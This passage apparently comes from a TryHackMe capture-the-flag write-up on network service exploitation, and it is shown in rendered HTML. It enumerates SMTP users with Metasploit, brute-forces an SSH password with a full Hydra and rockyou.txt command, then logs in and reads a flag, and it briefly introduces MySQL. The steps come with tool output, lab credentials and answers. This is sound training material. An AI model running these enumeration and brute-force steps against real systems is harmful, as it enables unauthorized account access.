</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/scanner/smtp/smtp_enum normal No SMTP User Enumeration Utility
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/scanner/smtp/smtp_enum
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_version<span style="color:#89dceb;font-weight:bold">)</span> &gt;</span></span></code></pre></div>
<br>
<p>We&rsquo;re going to be using the <code>top-usernames-shortlist.txt</code> wordlist from the usernames subsection of seclists (/usr/share/wordlists/SecLists/usernames if you have it installed).
Seclists is an amazing collection of wordlists. If you&rsquo;re running Kali or Parrot you can install seclists with: <code>sudo apt install seclists</code>.</p>
<br>
<p>What option do we need to set to the wordlist&rsquo;s path?</p>






<pre tabindex="0"><code>USER_FILE</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metaspl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>oit/basics/using-metasploit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>RPORT <span style="color:#fab387">25</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>UNIXONLY <span style="color:#89dceb">true</span> yes Skip Microsoft bannered servers when testing unix users
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>USER_FILE /opt/metasploit-framework/embedded/fram yes The file that contains a list of probable users accounts.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>ework/data/wordlists/unix_users.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>
<br>
<p>Once we&rsquo;ve set this option, what is the other essential parameter we need to set?</p>






<pre tabindex="0"><code>RHOSTS</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span><span style="color:#f5e0dc">USER_FILE</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/smtp/smtp_enum<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Banner: <span style="color:#fab387">220</span> polosmtp.home ESMTP Postfix <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Users found: administrator
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>What username is returned?</p>






<pre tabindex="0"><code>administrator</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.54.3:25 - 10.10.54.3:25 Users found: administrator</span></span></code></pre></div>
<br>
<h4 id="exploiting-smtp">Exploiting SMTP</h4>
<p>At the end of our Enumeration section we have a few vital pieces of information:</p>
<ol>
<li>A user account name</li>
<li>The type of SMTP server and Operating System running.</li>
</ol>
<p>We know from our port scan, that the only other open port on this machine is an SSH login. We&rsquo;re going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.</p>
<p>There is a wide array of customizability when it comes to using Hydra. Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the <code>/usr/share/wordlists directory</code> – If you would like to browse and find a different wordlists to the widely used &ldquo;rockyou.txt&rdquo;.</p>
<p>The syntax for the command we&rsquo;re going to use to find the password is this:</p>
<p><code>hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh</code></p>
<ul>
<li><code>hydra</code>: runs the hydra tool</li>
<li><code>-t 16</code>: number of parallel connections per target</li>
<li><code>-l [user]</code>: points to the user whose account you&rsquo;re trying to compromise</li>
<li><code>-P [path to dictionary]</code>: points to the file containing the list of possible passwords</li>
<li><code>-vV</code>: sets verbose mode to very verbose, shows the login+pass combination for each attempt</li>
<li><code>[machine ip]</code>: the IP address of the target machine</li>
<li><code>ssh / protocol</code>: sets the protocol</li>
</ul>
<br>
<p>What is the password of the user we found during our enumeration stage?</p>






<pre tabindex="0"><code>alejandro</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# hydra -t <span style="color:#fab387">16</span> -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.54.3 ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Hydra v8.6 <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#fab387">2017</span> by van Hauser/THC - Please <span style="color:#cba6f7">do</span> not use in military or secret service organizations, or <span style="color:#cba6f7">for</span> illegal purposes.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Hydra <span style="color:#89dceb;font-weight:bold">(</span>http://www.thc.org/thc-hydra<span style="color:#89dceb;font-weight:bold">)</span> starting at 2024-06-26 04:28:32
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>WARNING<span style="color:#89dceb;font-weight:bold">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#fab387">4</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> max <span style="color:#fab387">16</span> tasks per <span style="color:#fab387">1</span> server, overall <span style="color:#fab387">16</span> tasks, <span style="color:#fab387">14344398</span> login tries <span style="color:#89dceb;font-weight:bold">(</span>l:1/p:14344398<span style="color:#89dceb;font-weight:bold">)</span>, ~896525 tries per task
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>DATA<span style="color:#89dceb;font-weight:bold">]</span> attacking ssh://10.10.54.3:22/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> Resolving addresses ... <span style="color:#89dceb;font-weight:bold">[</span>VERBOSE<span style="color:#89dceb;font-weight:bold">]</span> resolving <span style="color:#cba6f7">done</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>INFO<span style="color:#89dceb;font-weight:bold">]</span> Testing <span style="color:#cba6f7">if</span> password authentication is supported by ssh://administrator@10.10.54.3:22
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>INFO<span style="color:#89dceb;font-weight:bold">]</span> Successful, password authentication is supported by ssh://10.10.54.3:22
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;123456&#34;</span> - <span style="color:#fab387">1</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;12345&#34;</span> - <span style="color:#fab387">2</span> of <span style="color:#fab387">14344398</span> <span style="color:#89dceb;font-weight:bold">[</span>child 1<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/0<span style="color:#89dceb;font-weight:bold">)</span></span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;killer&#34;</span> - <span style="color:#fab387">143</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 11<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;sandra&#34;</span> - <span style="color:#fab387">144</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 14<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;alejandro&#34;</span> - <span style="color:#fab387">145</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 15<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;buster&#34;</span> - <span style="color:#fab387">146</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 10<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span><span style="color:#89dceb;font-weight:bold">[</span>ATTEMPT<span style="color:#89dceb;font-weight:bold">]</span> target 10.10.54.3 - login <span style="color:#a6e3a1">&#34;administrator&#34;</span> - pass <span style="color:#a6e3a1">&#34;george&#34;</span> - <span style="color:#fab387">147</span> of <span style="color:#fab387">14344401</span> <span style="color:#89dceb;font-weight:bold">[</span>child 4<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>0/3<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span><span style="color:#89dceb;font-weight:bold">[</span>22<span style="color:#89dceb;font-weight:bold">][</span>ssh<span style="color:#89dceb;font-weight:bold">]</span> host: 10.10.54.3 login: administrator password: alejandro
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span><span style="color:#89dceb;font-weight:bold">[</span>STATUS<span style="color:#89dceb;font-weight:bold">]</span> attack finished <span style="color:#cba6f7">for</span> 10.10.54.3 <span style="color:#89dceb;font-weight:bold">(</span>waiting <span style="color:#cba6f7">for</span> children to <span style="color:#89dceb">complete</span> tests<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> target successfully completed, <span style="color:#fab387">1</span> valid password found</span></span></code></pre></div>
<br>
<p>Great! Now, let&rsquo;s SSH into the server as the user, what is contents of smtp.txt</p>






<pre tabindex="0"><code>THM{who_knew_email_servers_were_c00l?}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# ssh administrator@10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>The authenticity of host <span style="color:#a6e3a1">&#39;10.10.54.3 (10.10.54.3)&#39;</span> can<span style="color:#a6e3a1">&#39;t be established.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#a6e3a1">ECDSA key fingerprint is SHA256:ABheODwYmk63/Mmp8cbMSoVTNv3vcgWbzukZoGMb62I.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#a6e3a1">Are you sure you want to continue connecting (yes/no)? yes
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#a6e3a1">Warning: Permanently added &#39;</span>10.10.54.3<span style="color:#a6e3a1">&#39; (ECDSA) to the list of known hosts.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#a6e3a1">administrator@10.10.54.3&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-111-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>System information as of Wed Jun <span style="color:#fab387">26</span> 03:31:06 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>System load: 0.01 Processes: <span style="color:#fab387">91</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Usage of /: 43.9% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Memory usage: 15% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#fab387">87</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#fab387">35</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>Last login: Wed Apr <span style="color:#fab387">22</span> 22:21:42 <span style="color:#fab387">2020</span> from 192.168.1.110
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>administrator@polosmtp:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>dead.letter Maildir smtp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>administrator@polosmtp:~$ cat smtp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>who_knew_email_servers_were_c00l?<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="mysql">MySQL</h3>
<hr>
<h4 id="understanding-mysql">Understanding MySQL</h4>
<p>MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL).</p>
<p>MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.</p>
<ol>
<li>MySQL creates a database for storing and manipulating data, defining the relationship of each table.</li>
<li>Clients make requests by making specific statements in SQL.</li>
<li>The server will respond to the client with whatever information has been requested.</li>
</ol>
<br>
<p>What type of software is MySQL?</p>






<pre tabindex="0"><code>Relational Database Management System</code></pre>
<br>
